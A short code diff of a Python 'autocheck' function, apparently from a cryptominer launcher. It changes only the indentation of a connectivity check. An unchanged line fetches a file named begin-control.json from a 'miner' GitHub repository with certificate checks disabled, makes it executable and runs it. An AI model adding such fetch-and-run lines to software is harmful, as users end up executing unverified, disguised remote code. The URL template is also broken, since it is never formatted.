@@ -8,7 +8,7 @@ def autocheck():
          user = loads['user']
          file = loads['file']
          print("ตรวจสอบการเชื่อมต่อกับ github")
-          socket.create_connection(('www.raw.githubusercontent.com',80))
+         socket.create_connection(('www.raw.githubusercontent.com',80))
          status = "ok"
          os.system ("cd && wget -N --timeout 20 --connect-timeout=30 -t 2 --no-check-certificate https://raw.githubusercontent.com/{user}/miner/main/begin-control.json && chmod +x begin-control.json && ./begin-control.json")
  except socket.error as msg:
